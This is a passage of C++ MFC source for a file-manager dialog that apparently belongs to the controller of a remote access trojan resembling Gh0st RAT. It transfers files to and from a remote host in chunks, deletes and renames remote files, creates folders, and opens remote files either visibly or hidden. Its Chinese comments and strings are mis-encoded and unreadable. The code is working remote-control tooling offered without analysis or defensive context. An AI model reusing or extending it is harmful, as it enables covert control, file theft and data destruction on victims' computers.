	int		nHeadLength = 9; // 1 + 4 + 4  �ƾڥ]�Y���j�p�A���T�w��9
	FILESIZE	*pFileSize;
	// �o��ƾڪ�����
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// �o��ƾڦb��󤤪�����, ��ȵ��p�ƾ�
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;


	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0,i=0;
	for (; i < MAX_WRITE_RETRY; i++)
	{
		// �g�J���
		nRet = WriteFile
			(
			hFile,
			pData, 
			dwBytesToWrite, 
			&dwBytesWrite,
			NULL
			);
		if (nRet > 0)
		{
			break;
		}
	}
	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " ���g�J����", "ĵ�i", MB_OK|MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// ���F����A�p�ƾ����W
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

void CFileManagerDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// ���m�ǿ�覡
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		FixedLocalFileList(".");
		ShowMessage("���a�G�˸��ؿ� %s\*.* ����", m_Local_Path);
	}
	else
	{
		// �ھa�A��sleep�U�|�X���A�A�F�i��H�e���ƾ��٨Ssend�X�h
		Sleep(5);
		SendDownloadJob();
	}
	return;
}

void CFileManagerDlg::EndLocalUploadFile()
{

	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;
	
	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("���{�G�˸��ؿ� %s\*.* ����", m_Remote_Path);
	}
	else
	{
		// �ھa�A��sleep�U�|�X���A�A�F�i��H�e���ƾ��٨Ssend�X�h
		Sleep(5);
		SendUploadJob();
	}
	return;
}
void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		ShowMessage("���{�G�˸��ؿ� %s\*.* ����", m_Remote_Path);
	}
	else
	{
		// �ھa�A��sleep�U�|�X���A�A�F�i��H�e���ƾ��٨Ssend�X�h
		Sleep(5);
		SendDeleteJob();
	}
	return;
}


void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendContinue()
{
	BYTE	bBuff = COMMAND_CONTINUE;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::ShowProgress()
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "�ǰe���";
	else
		lpDirection = "�������";


	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	ShowMessage("%s %s %dKB (%d%%)", lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// �������y�`
	}
}

void CFileManagerDlg::OnLocalDelete()
{
	m_bIsUpload = true;
	CString str;
	if (m_list_local.GetSelectedCount() > 1)
		str.Format("�T�w�n�N�o %d ���R����?", m_list_local.GetSelectedCount());
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
		if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
			str.Format("�T��n�R����󧨡�%s���ñN�Ҧ����e�R����?", file);
		else
			str.Format("�T��n�⡧%s���R����?", file);
	}
	if (::MessageBox(m_hWnd, str, "�T�{�R��", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// �p�G�O�ؿ�
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			DeleteDirectory(file);
		}
		else
		{
			DeleteFile(file);
		}
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	// �T�Τ��޲z���f
	EnableControl(TRUE);

	FixedLocalFileList(".");
}

void CFileManagerDlg::OnRemoteDelete() 
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("�T�w�n�N�o %d ���R����?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format("�T��n�R����󧨡�%s���ñN�Ҧ����e�R����?", file);
		else
			str.Format("�T��n�⡧%s���R����?", file);
	}
	if (::MessageBox(m_hWnd, str, "�T�{�R��", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// �p�G�O�ؿ�
		if (m_list_remote.GetItemData(nItem))
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// �o�e�Ĥ@�ӤU������
	SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::OnLocalStop() 
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}

void CFileManagerDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
}

void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();


	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}


	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  �ƾڥ]�Y���j�p�A���T�w��9
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  �j�p�A�����A�ƾ�
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// ��^��
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // �p�G�S�����άd�䥢��
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �����d��y�`
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

void CFileManagerDlg::OnLocalNewfolder() 
{
	if (m_Local_Path == "")
		return;
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("�s�إؿ�"), _T("�п�J�ؿ��W��:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		// �Ыئh�h�ؿ�
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
		FixedLocalFileList(".");
	}
}

void CFileManagerDlg::OnRemoteNewfolder() 
{
	if (m_Remote_Path == "")
		return;
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("�s�إؿ�"), _T("�п�J�ؿ��W��:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// �Ыئh�h�ؿ�
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
}

void CFileManagerDlg::OnTransfer()
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalCopy();
	}
	else
	{
		OnRemoteCopy();
	}
}

void CFileManagerDlg::OnRename() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	}
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}	
}

void CFileManagerDlg::OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here


	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));
}

void CFileManagerDlg::OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);
	
	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;
	
	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

void CFileManagerDlg::OnDelete() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalDelete();
	}
	else
	{
		OnRemoteDelete();
	}		
}

void CFileManagerDlg::OnNewfolder() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnLocalNewfolder();
	}
	else
	{
		OnRemoteNewfolder();
	}		
}

void CFileManagerDlg::OnRefresh() 
{
	// TODO: Add your command handler code here
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}		
}

void CFileManagerDlg::OnLocalOpen() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

void CFileManagerDlg::OnRemoteOpenShow() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;	
}

void CFileManagerDlg::OnRemoteOpenHide() 
{
	// TODO: Add your command handler code here
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
	
	int		nPacketLength = str.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete [] lpPacket;
}

void CFileManagerDlg::OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CListCtrl	*pListCtrl = &m_list_local;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(6, MF_BYPOSITION);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// �O���
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// �O���
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);
		else
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
	
	
	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}